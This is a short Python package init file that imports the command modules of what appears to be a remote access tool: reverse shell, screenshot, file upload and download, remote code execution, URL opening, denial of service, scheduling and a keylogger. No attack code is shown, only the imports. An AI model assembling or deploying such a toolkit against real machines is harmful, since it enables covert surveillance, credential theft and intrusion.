from .echo import echo
from .who import who
from .reverse_shell import shell
from .screenshot import screenshot
from .put_file import put_file
from .get_file import get_file
from .runcode import runcode
from .openurl import openurl
from .dos import dos
from .scheduler import scheduler
try:
    from .keylogger import keylogger # pynput in root user raise (`Xlib.error.DisplayNameError: Bad display name ""`) 
except:
    pass